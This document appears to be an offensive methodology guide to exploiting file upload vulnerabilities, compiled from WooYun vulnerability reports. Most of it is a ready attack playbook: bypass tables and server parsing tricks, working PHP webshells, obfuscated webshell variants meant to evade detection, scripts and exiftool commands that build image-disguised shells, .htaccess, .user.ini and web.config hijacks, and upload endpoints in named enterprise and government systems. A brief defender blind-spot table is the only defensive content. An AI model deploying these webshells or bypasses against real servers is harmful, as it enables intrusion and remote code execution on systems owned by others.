# File Upload Vulnerability Analysis Methodology

> Distilled from 2,711 cases | Data source: WooYun Vulnerability Database (2010-2016)

**Contents:** [1. Core Attack Model](#1-core-attack-model) | [2. Upload Point Identification](#2-upload-point-identification-matrix) | [3. Detection Bypass](#3-detection-bypass-methodology) | [4. Parsing Vulnerabilities](#4-parsing-vulnerability-exploitation) | [5. Webshell Techniques](#5-webshell-techniques) | [6. Vulnerable CMS/Frameworks](#6-common-vulnerable-cmsframeworks) | [7. Path Retrieval](#7-upload-path-retrieval-techniques) | [8. Defense Bypass Framework](#8-defense-bypass-thinking-framework) | [9. Key Insights](#9-key-insights) | [10. Practical Checklist](#10-practical-checklist) | [11. Validation Defect Analysis](#11-validation-defect-analysis) | [12. File Header Bypass Techniques](#12-file-header-bypass-techniques) | [13. Webshell Upload Locations](#13-webshell-upload-locations) | [14. Real-World Case Analysis](#14-real-world-case-analysis)

---

## 1. Core Attack Model

```
+-------------------------------------------------------------------------+
|                     File Upload Vulnerability Attack Chain               |
+-------------------------------------------------------------------------+
| Upload Point Discovery -> Detection Bypass -> Path Retrieval ->         |
| Parsing Exploitation -> Webshell Execution -> Post-Exploitation         |
+-------------------------------------------------------------------------+
```

### Attack Success Rate Core Formula

```
Success Rate = P(Bypass Detection) x P(Obtain Path) x P(Parse & Execute)
```

**Key Insight**: Most defenses focus solely on "bypass detection," neglecting path leakage and parsing configuration issues.

---

## 2. Upload Point Identification Matrix

| Upload Point Type | Frequency | Risk Level | Typical Path | Exploitation Difficulty |
|------------------|-----------|------------|-------------|----------------------|
| **Rich Text Editors** | 42% | Critical | `/fckeditor/`, `/ewebeditor/`, `/ueditor/` | Low |
| **Avatar Upload** | 18% | High | `/upload/avatar/`, `/member/uploadfile/` | Medium |
| **Attachment/Document Upload** | 15% | High | `/uploads/`, `/attachment/` | Medium |
| **Admin Panel Upload** | 12% | Critical | `/admin/upload/`, `/system/upload/` | Low |
| **Business Function Upload** | 8% | Medium | `/apply/`, `/submit/` | High |
| **Import Functions** | 5% | High | `/import/`, `/excelUpload/` | Medium |

### 2.1 Rich Text Editor Vulnerability Distribution

```
+------------------------------------------------------------+
|        Editor Vulnerability Share (Based on 50 Cases)      |
+------------------------------------------------------------+
|  FCKeditor    ========================  48%                |
|  eWebEditor   ==============  28%                          |
|  UEditor      ======  12%                                  |
|  KindEditor   ====  8%                                     |
|  Other        ==  4%                                       |
+------------------------------------------------------------+
```

### 2.2 High-Risk Editor Path Quick Reference

| Editor | Test Path | Upload Endpoint |
|--------|-----------|----------------|
| FCKeditor | `/FCKeditor/editor/filemanager/browser/default/connectors/test.html` | `/connectors/jsp/connector` |
| FCKeditor | `/FCKeditor/editor/filemanager/browser/default/browser.html` | `?Connector=connectors/jsp/connector` |
| eWebEditor | `/ewebeditor/admin/default.jsp` | `/uploadfile/` |
| UEditor | `/ueditor/controller.jsp?action=config` | `/ueditor/controller.jsp` |

---

## 3. Detection Bypass Methodology

### 3.1 Detection Types and Bypass Strategy Matrix

| Detection Type | Detection Location | Bypass Method | Success Rate | Case ID |
|---------------|-------------------|--------------|-------------|---------|
| **JavaScript Validation** | Client-side | Disable JS / Burp interception | 95% | WooYun-2014-068939 |
| **Extension Blocklist** | Server-side | Case variation / double-write / special extensions | 70% | WooYun-2015-0108457 |
| **Extension Allowlist** | Server-side | %00 truncation / parsing vulnerabilities | 40% | WooYun-2016-0167456 |
| **Content-Type** | HTTP Header | Modify to image/jpeg | 85% | WooYun-2016-0212792 |
| **File Header Detection** | File Content | Prepend GIF89a header | 75% | - |
| **Content Detection** | File Content | Image-based webshell / encoding bypass | 60% | - |

### 3.2 Extension Bypass Details

#### 3.2.1 Blocklist Bypass Techniques

```
+-------------------------------------------------------------------------+
|                    Extension Bypass Quick Reference                      |
+-------------------------------------------------------------------------+
| Technique         | PHP Environment        | ASP/ASPX Env     | JSP Env |
+-------------------------------------------------------------------------+
| Case Variation    | .Php .pHp .PHP         | .Asp .aSp         | .Jsp .jSp  |
| Double-Write      | .pphphp                | .asaspp           | .jsjspp    |
| Special Extension | .php3 .php5 .phtml     | .asa .cer .cdx    | .jspx .jspa|
| Space/Dot Bypass  | .php .                 | .asp.             | .jsp.      |
| ::$DATA Stream    | N/A                    | .asp::$DATA       | N/A        |
| %00 Truncation    | .php%00.jpg            | .asp%00.jpg       | .jsp%00.jpg|
| Semicolon (IIS)   | N/A                    | .asp;.jpg         | N/A        |
+-------------------------------------------------------------------------+
```

#### 3.2.2 Real-World Bypass Cases

**Case 1: An OA System Null-Byte Truncation Bypass** (WooYun-2014-064031)
```
Original file: shell.jsp
Bypass method: shell.jsp%00.jpg (truncation after URL decoding)
Upload endpoint: /defaultroot/dragpage/upload.jsp
```

**Case 2: HTTP Response Modification Bypass** (WooYun-2015-0108457)
```
Technique: Modify the server-returned allowed types list
Steps:
1. Intercept server Response
2. Modify allowedTypes to include jsp
3. Upload jsp file normally
```

### 3.3 Content-Type Bypass

| Original Type | Modified To | Applicable Scenario |
|--------------|------------|-------------------|
| `application/octet-stream` | `image/jpeg` | General |
| `application/x-php` | `image/gif` | PHP environments |
| `text/plain` | `image/png` | Text-based scripts |

### 3.4 File Content Bypass

```
Image-based webshell creation methods:
GIF89a
(malicious code content)

Or using the copy command to merge:
copy /b image.gif+shell.php shell.gif
```

---

## 4. Parsing Vulnerability Exploitation

### 4.1 Parsing Vulnerability Overview

```
+-------------------------------------------------------------------------+
|                    Web Server Parsing Vulnerabilities                    |
+-------------------------------------------------------------------------+
|                                                                         |
|  IIS 5.x/6.0                                                          |
|  |-- Directory parsing: /shell.asp/1.jpg  -> Parsed as ASP            |
|  |-- File parsing: shell.asp;.jpg    -> Parsed as ASP                 |
|  |-- Malformed parsing: shell.asp.jpg -> May be parsed as ASP         |
|                                                                         |
|  Apache                                                                |
|  |-- Multi-suffix parsing: shell.php.xxx -> Parses right-to-left,     |
|  |   executes on recognizable suffix                                   |
|  |-- .htaccess: AddType application/x-httpd-php .jpg                  |
|  |-- Newline parsing: shell.php%0a -> CVE-2017-15715                  |
|                                                                         |
|  Nginx                                                                 |
|  |-- Malformed parsing: /1.jpg/shell.php -> Parsed as PHP             |
|  |   (cgi.fix_pathinfo=1)                                             |
|  |-- Null byte: shell.jpg%00.php -> Older version vulnerability       |
|  |-- CVE-2013-4547: shell.jpg \0.php -> Requires specific version     |
|                                                                         |
|  Tomcat                                                                |
|  |-- PUT method: PUT /shell.jsp/ -> CVE-2017-12615                    |
|                                                                         |
+-------------------------------------------------------------------------+
```

### 4.2 IIS 6.0 Parsing Vulnerability in Practice

**Case: FCKeditor + IIS6 Parsing** (WooYun-2015-0138435)

```
Uploaded file: ali.asp;ali.jpg
Actual parsing: ali.asp (content after semicolon is ignored)
Shell path: /Fckeditor/UserFiles/File/ali.asp;ali(2).jpg

Key point: Uploading consecutively twice may succeed
Reason: First attempt may fail; second attempt with renamed file changes semicolon position
```

### 4.3 Apache Parsing Vulnerability in Practice

**Case: Multi-Suffix Parsing**
```
Uploaded file: shell.php.xxx
Apache config: Continues parsing left when .xxx suffix is unrecognized
Result: Executed as PHP

Defense bypass: When .php is blocked
Try: .php3, .php5, .phtml, .phar
```

### 4.4 Nginx Parsing Vulnerability in Practice

**Case: PHP-CGI Parsing Vulnerability** (WooYun-2015-0158311)
```
Normal upload: test.jpg (containing PHP code)
Access path: /upload/test.jpg/.php
Or: /upload/test.jpg/shell.php

Prerequisites:
- cgi.fix_pathinfo = 1 (PHP configuration)
- Nginx lacks security restrictions
```

---

## 5. Webshell Techniques

### 5.1 One-Liner Webshell Variations

| Language | Basic Form | Variation Technique |
|----------|-----------|-------------------|
| **PHP** | Dynamic code execution | Variable concatenation / callback functions |
| **ASP** | Request object invocation | Unicode encoding |
| **ASPX** | Page Language method | Encryption obfuscation |
| **JSP** | Runtime.getRuntime | Using JSPX format |

### 5.2 Evasion Techniques

```
PHP variable function:
$a = 'as'.'sert';
$a($_POST['x']);

PHP callback function:
array_map('assert', array($_POST['x']));

PHP dynamic invocation:
$f = create_function('', $_POST['x']);
$f();
```

### 5.3 JSPX WAF Bypass

**Case: FCKeditor JSPX Upload** (WooYun-2015-0149146)

JSPX is an XML format variant of JSP with the following characteristics:
- WAFs typically inspect `.jsp` but ignore `.jspx`
- Tomcat supports JSPX parsing by default
- Can bind namespaces to execute arbitrary code

---

## 6. Common Vulnerable CMS/Frameworks

### 6.1 High-Risk Target Statistics

```
+------------------------------------------------------------+
|       Vulnerable CMS/Framework Distribution (50 Cases)     |
+------------------------------------------------------------+
|  OA Systems (enterprise)      ================  32%        |
|  Government Systems           ==========  20%              |
|  FCKeditor-Integrated Sites   ========  16%                |
|  Education Systems            ======  12%                  |
|  PHP CMS (Jeecms/Finecms)    ====  8%                     |
|  Enterprise Portals           ====  8%                     |
|  Other                        ==  4%                       |
+------------------------------------------------------------+
```

### 6.2 High-Risk CMS Vulnerability Quick Reference

| CMS/System | Vulnerability Type | Vulnerability Path | Exploitation Conditions |
|-----------|-------------------|-------------------|----------------------|
| **An enterprise OA system** | Arbitrary file upload | `/defaultroot/dragpage/upload.jsp` | Null-byte truncation bypass |
| **An enterprise collaboration platform** | Arbitrary file upload | `/oaerp/ui/sync/excelUpload.jsp` | Bypass JS restriction |
| **An enterprise ERP system** | Arbitrary file upload | `/kdgs/core/upload/upload.jsp` | Registered user access |
| **Jeecms** | Arbitrary file upload | Admin template feature | Requires admin access |
| **Finecms** | Race condition upload | `/member/controllers/Account.php` | Registered user access |
| **PHPEMS** | Arbitrary file upload | `/app/document/api.php` | No extension check |
| **EnableQ** | Arbitrary file upload | Multiple upload endpoints | No login required |

### 6.3 Common Vulnerability Patterns

**Pattern 1: Admin Functions Without Authentication**
```
Issue: Upload functionality does not verify login status
Case: WooYun-2015-0123700 (a university career information system)
Path: /Adminiscentertrator/AdmLinkInsert.asp
Exploitation: Relies only on JavaScript redirect; disabling JS grants access
```

**Pattern 2: Unrestricted Import Functionality**
```
Issue: Excel/file import function allows arbitrary file uploads
Case: WooYun-2014-074398 (an enterprise collaboration platform)
Path: /oaerp/ui/sync/excelUpload.jsp
Exploitation: Bypass JS restriction, brute-force filenames
```

**Pattern 3: Race Condition Vulnerability**
```
Issue: Time gap between upload and deletion
Case: WooYun-2014-063369 (Finecms)
Exploitation: Multi-threaded upload + access, execute before deletion
Technique: Malicious file generates a new file that is not subject to deletion
```

---

## 7. Upload Path Retrieval Techniques

### 7.1 Path Leakage Methods

| Method | Description | Case |
|--------|------------|------|
| **Direct Response Return** | Full path returned after successful upload | Most cases |
| **Preview Function** | View uploaded files to obtain path | WooYun-2015-0108457 |
| **Directory Traversal** | FCKeditor connector directory listing | WooYun-2015-0152437 |
| **Path Rule Guessing** | Timestamp + random number naming convention | WooYun-2014-074398 |
| **Error Messages** | Error pages leak paths | - |
| **Source Code Audit** | Analyze code to determine naming rules | - |

### 7.2 Naming Rule Brute Force

**Case: Timestamp Naming Brute Force** (WooYun-2014-074398)
```
Naming rule: Upload time (to the second) + original filename
Example: 20140829221136jsp.jsp

Brute-force method:
1. Record upload time
2. Brute-force second offset (+/-60 seconds)
3. Attempt access to obtain shell
```

---

## 8. Defense Bypass Thinking Framework

### 8.1 Systematic Analysis

```
+-------------------------------------------------------------------------+
|                Defense Mechanism Reverse Analysis Framework              |
+-------------------------------------------------------------------------+
|                                                                         |
|  Layer 1: Identify Defense Points                                      |
|  |-- Client-side detection? (JS/Flash restrictions)                    |
|  |-- Server-side detection? (Extension/Content-Type/Content)           |
|  |-- WAF detection? (Signature matching/behavioral analysis)           |
|                                                                         |
|  Layer 2: Analyze Detection Logic                                      |
|  |-- Blocklist or allowlist?                                           |
|  |-- What is the detection order?                                      |
|  |-- Are there logic flaws?                                            |
|                                                                         |
|  Layer 3: Construct Bypass Vectors                                     |
|  |-- Single-point bypass: Targeting specific detection                 |
|  |-- Combined bypass: Multiple techniques in concert                   |
|  |-- Logic bypass: Exploiting design defects                           |
|                                                                         |
|  Layer 4: Validate and Iterate                                         |
|  |-- Test bypass effectiveness                                         |
|  |-- Analyze failure reasons                                           |
|  |-- Adjust bypass strategy                                            |
|                                                                         |
+-------------------------------------------------------------------------+
```

### 8.2 Decision Tree

```
                        +-------------------+
                        | Upload Feature    |
                        | Discovered        |
                        +---------+---------+
                                  |
                     +------------v------------+
                     | Client-side restriction? |
                     +------------+------------+
                           Yes    |    No
                     +------------+------------+
                     |                         |
             +-------v-------+         +-------v-------+
             | Disable JS /  |         | Direct upload |
             | intercept     |         | test          |
             +-------+-------+         +-------+-------+
                     |                         |
                     +------------+------------+
                                  |
                     +------------v------------+
                     | Server-side error?       |
                     +------------+------------+
                                  |
         +------------------------+------------------------+
         |                        |                        |
  +------v-------+        +------v-------+        +-------v------+
  | Extension    |        | Content-Type |        | File Content |
  | error        |        | error        |        | error        |
  +------+-------+        +------+-------+        +-------+------+
         |                        |                        |
  +------v-------+        +------v-------+        +-------v------+
  | Try extension|        | Modify       |        | Add file     |
  | bypass: case |        | Content-Type |        | header /     |
  | /truncation  |        | header       |        | image-based  |
  +--------------+        +--------------+        | webshell     |
                                                  +--------------+
```

---

## 9. Key Insights

### 9.1 Attacker Perspective Meta-Analysis

1. **Editors are the biggest attack surface**: 42% of cases involve rich text editors, and most websites run outdated editor versions

2. **Client-side validation = no validation**: 100% of pure client-side validation can be bypassed; this is the most basic yet most common mistake

3. **Path leakage is critically underestimated**: Even when upload succeeds, exploitation is difficult without a returned path; yet most systems leak paths

4. **Server configuration is the last line of defense**: IIS 6.0 parsing vulnerabilities still exist in large numbers of government and enterprise systems

5. **Race conditions are an advanced bypass**: When all validation checks are correct, exploiting the deletion time window can still achieve shell access

### 9.2 Blind Spots Defenders Should Address

| Blind Spot | Problem Description | Recommendation |
|-----------|-------------------|----------------|
| **Editor Updates** | Using outdated editor versions | Regularly update or remove test files |
| **Directory Permissions** | Upload directories can execute scripts | Disable execution permissions on upload directories |
| **Path Disclosure** | Returning complete upload paths | Use randomized paths or CDN |
| **Parsing Configuration** | Server has parsing vulnerabilities | Upgrade servers, disable dangerous parsing |
| **Race Conditions** | Time gap between upload-check-delete | Check before storing, or use atomic operations |

---

## 10. Practical Checklist

### 10.1 Penetration Testing Checklist

- [ ] Scan for common editor paths
- [ ] Test various upload points (avatar, attachment, import)
- [ ] Disable JavaScript to test client-side validation
- [ ] Test extension bypass (case variation, double-write, truncation)
- [ ] Test Content-Type modification
- [ ] Test file header bypass
- [ ] Identify server type, test corresponding parsing vulnerabilities
- [ ] Analyze file naming conventions
- [ ] Test directory traversal to obtain paths
- [ ] Test race condition upload

### 10.2 Quick Vulnerability Verification

```
FCKeditor Quick Check:
Visit /FCKeditor/editor/filemanager/browser/default/connectors/test.html

Directory Traversal Test (FCKeditor):
Visit /FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=/../

IIS Parsing Vulnerability Test:
Upload shell.asp;.jpg and access it
```

---

## Appendix: Case Index

| Case ID | Key Technique | Target Type |
|---------|--------------|------------|
| WooYun-2015-0108457 | HTTP Response Modification | A transportation system |
| WooYun-2015-0135258 | FCKeditor | A public transit system |
| WooYun-2016-0167456 | %00 Truncation | A financial system |
| WooYun-2014-064031 | Null-byte truncation bypass | An enterprise OA system |
| WooYun-2015-090186 | eWebEditor | A government procurement system |
| WooYun-2014-063369 | Race Condition | Finecms |
| WooYun-2015-0126541 | Architecture Analysis | An enterprise OA system |
| WooYun-2015-0149146 | JSPX Bypass | An insurance system |
| WooYun-2015-0158311 | Parsing Vulnerability | A major web portal |
| WooYun-2016-0212792 | Extension Bypass | A telecom provider |

---

## 11. Validation Defect Analysis

### Case: WooYun-2015-0127845

**Vulnerability Surface**:
```json
{
  "bug_id": "wooyun-2015-0127845",
  "title": "A system file upload leading to arbitrary code execution",
  "vuln_type": "Vulnerability Type: File upload leading to arbitrary code execution",
  "level": "Severity: High",
  "detail": "Upload function did not properly validate file type, uploaded .php file was executed",
  "poc": "Upload shell.php with content: <?php system($_POST['cmd']); ?>"
}
```

| Dimension | Surface Issue | Underlying Defect | Systemic Impact |
|----------|--------------|-------------------|-----------------|
| **Validation Location** | Weak server-side validation | Possibly missing client + server dual validation | Expanded attack surface |
| **Validation Method** | Type not properly validated | Possibly using blocklist instead of allowlist | Many bypass vectors |
| **Validation Scope** | Only extension validated | Content-Type, file header, content not validated | Partial validation bypassable |
| **Execution Context** | Upload directory is executable | Web server configuration allows parsing in upload directory | Single defense layer |
| **Access Control** | Possibly no permission check | Upload function access not restricted | Easy lateral movement |

Blocklists fail because extensions are an open set; allowlists are the only production-acceptable approach.

---

## 12. File Header Bypass Techniques

### 12.1 Common File Headers (Magic Numbers) Quick Reference

```
| File Type  | Magic Number (Hex)        | ASCII       | Offset |
|------------|---------------------------|-------------|--------|
| JPEG       | FF D8 FF                  | ...         | 0      |
| PNG        | 89 50 4E 47               | .PNG        | 0      |
| GIF        | 47 49 46 38               | GIF8        | 0      |
| BMP        | 42 4D                     | BM          | 0      |
| TIFF       | 49 49 2A 00               | II*.        | 0      |
| PDF        | 25 50 44 46               | %PDF        | 0      |
| ZIP        | 50 4B 03 04               | PK..        | 0      |
| RAR        | 52 61 72 21               | Rar!        | 0      |
| ELF        | 7F 45 4C 46               | .ELF        | 0      |
| EXE        | 4D 5A                     | MZ          | 0      |
```

### 12.2 File Header Spoofing Techniques

**Simple file header prepending**:
```php
// GIF file header
GIF89a<?php system($_POST['cmd']); ?>

// JPEG file header
FF D8 FF<?php system($_POST['cmd']); ?>

// PNG file header
89 50 4E 47<?php system($_POST['cmd']); ?>
```

**Image-based webshell creation**:
```bash
# Windows
copy /b image.gif+shell.php shell.gif

# Linux/Mac
cat image.gif shell.php > shell.gif

# Using exiftool to inject PHP into EXIF
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```

**Binary file header construction**:
```python
def create_fake_gif(php_code):
    gif_header = b'GIF89a'
    return gif_header + php_code.encode()

php_code = "<?php system($_POST['cmd']); ?>"
fake_gif = create_fake_gif(php_code)

with open('shell.gif', 'wb') as f:
    f.write(fake_gif)
```

### 12.3 Advanced Bypass: Polyglot Files and EXIF Injection

```bash
# Use exiftool to inject code into EXIF
exiftool -Comment='<?php system($_GET["x"]); ?>' image.jpg

# Use with LFI vulnerability
# /image.php?file=uploads/image.jpg
# If include() processes this file, PHP in EXIF will execute

# Use steghide tool to hide PHP inside an image
steghide embed -cf image.jpg -ef shell.php
# Note: Requires a file inclusion vulnerability
```

---

## 13. Webshell Upload Locations

### 13.1 Upload Location Risk Matrix

```
| Location Type           | Risk  | Access     | Persistence  | Detection  |
|                         | Level | Difficulty | Capability   | Difficulty |
|-------------------------|-------|------------|--------------|------------|
| 1. Rich text editor dir | 5/5   | Low        | Strong       | Low        |
| 2. User avatar upload   | 4/5   | Medium     | Medium       | Low        |
| 3. Attachment/doc dir   | 4/5   | Medium     | Medium       | Medium     |
| 4. Temporary file dir   | 3/5   | High       | Weak         | High       |
| 5. Log directory        | 2/5   | High       | Weak         | High       |
| 6. Cache directory      | 3/5   | High       | Medium       | High       |
| 7. Backup directory     | 4/5   | Medium     | Strong       | Medium     |
| 8. Config file dir      | 5/5   | Low        | Very Strong  | Medium     |
| 9. Theme/template dir   | 5/5   | Low        | Very Strong  | Low        |
| 10. User upload root    | 4/5   | Low        | Strong       | Low        |
```

### 13.2 Editor-Specific Upload Paths

| Editor | Default Path | Exploitation Characteristics | Persistence |
|--------|-------------|----------------------------|-------------|
| **FCKeditor** | `/FCKeditor/UserFiles/` | Many files, easy to hide | High |
| **CKeditor** | `/ckfinder/userfiles/` | Has connector interface | High |
| **eWebEditor** | `/ewebeditor/uploadfile/` | Many vulnerabilities in older versions | High |
| **UEditor** | `/ueditor/php/upload/` | Can upload configuration files | High |
| **KindEditor** | `/kindeditor/attached/` | Can traverse directories | Medium |
| **TinyMCE** | `/tinymce/uploads/` | Depends on integration method | Medium |

**Editor fingerprint paths**:
```bash
# FCKeditor signatures
/FCKeditor/editor/filemanager/browser/default/connectors/test.html
/FCKeditor/editor/filemanager/upload/test.html

# UEditor signatures
/ueditor/net/controller.ashx
/ueditor/php/controller.php

# eWebEditor signatures
/ewebeditor/admin_uploadfile.asp
/ewebeditor/php/upload.php
```

### 13.3 Configuration File Hijacking

```apache
# .htaccess parsing hijack
<FilesMatch "\.jpg">
  SetHandler application/x-httpd-php
</FilesMatch>
```

```ini
# .user.ini (PHP-FPM)
auto_prepend_file=/var/www/html/uploads/shell.jpg
# All PHP files automatically include shell.jpg before execution
```

```xml
<!-- web.config (IIS) -->
<configuration>
  <system.webServer>
    <handlers>
      <add name="PHP" path="*.jpg" verb="*" modules="FastCgiModule"
           scriptProcessor="C:\php\php-cgi.exe" resourceType="Unspecified" />
    </handlers>
  </system.webServer>
</configuration>
```

### 13.4 Webshell Concealment Techniques

```php
// 1. Variable obfuscation
$a = 'syste';
$b = 'm';
$ab = $a.$b;
$ab($_POST['x']);

// 2. Callback functions
array_map('ass'.'ert', array($_POST['x']));

// 3. Dynamic functions
$func = $_REQUEST['f'];
$func($_REQUEST['cmd']);

// 4. Letterless webshell
$_=''; $_[+'']='='; $__='_';
$_=++$_; $_++; $_++; $_++; $_++; $_++; // 6
$__++; $__++; // 2
$___=$_$__; // 6+2=8 (chr)
// Using mathematical operations to generate characters

// 5. Using exception handling
set_exception_handler('system');
throw new Exception($_POST['cmd']);
```

---

## 14. Real-World Case Analysis

### 14.1 Case: WooYun-2015-0127845 Exploitation

**Vulnerability info**:
```json
{
  "bug_id": "wooyun-2015-0127845",
  "title": "A system file upload leading to arbitrary code execution",
  "level": "Severity: High",
  "detail": "Upload function did not properly validate file type, uploaded .php file was executed",
  "poc": "Upload shell.php with content: <?php system($_POST['cmd']); ?>"
}
```

**Inferred vulnerable code**:
```php
class UploadController {
    public function upload() {
        $file = $_FILES['file'];

        // Error 1: Only checks MIME type (client-controllable)
        $allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
        if (!in_array($file['type'], $allowed_types)) {
            return ['error' => 'File type not allowed'];
        }

        // Error 2: No extension check, no renaming
        // Error 3: Upload directory can execute PHP
        $upload_dir = '/var/www/html/uploads/';
        move_uploaded_file($file['tmp_name'], $upload_dir . $file['name']);

        // Error 4: Returns full path (information disclosure)
        return ['url' => 'http://target/uploads/' . $file['name']];
    }
}
```

**Exploitation**: Modify Content-Type to `image/jpeg` via Burp/curl, upload `.php` shell directly. Path returned in response.

---

*Document generation date: 2026-01-23*
*Data source: WooYun vulnerability database (2,711 file upload vulnerabilities out of 88,636 total entries)*
